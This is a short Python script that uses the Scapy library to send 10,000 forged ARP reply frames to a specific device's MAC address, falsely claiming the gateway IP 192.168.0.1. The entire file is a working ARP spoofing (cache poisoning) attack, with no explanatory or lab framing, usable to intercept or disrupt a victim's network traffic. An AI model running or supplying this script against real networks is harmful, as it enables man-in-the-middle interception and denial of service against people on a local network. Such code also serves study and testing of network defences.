from scapy.all import *

target_mac = "98:e7:f4:5e:49:80"
switch_ip = "192.168.0.1"

sendp(Ether(dst=target_mac)/ARP(op=2, hwdst=target_mac, psrc=switch_ip), count = 10000)
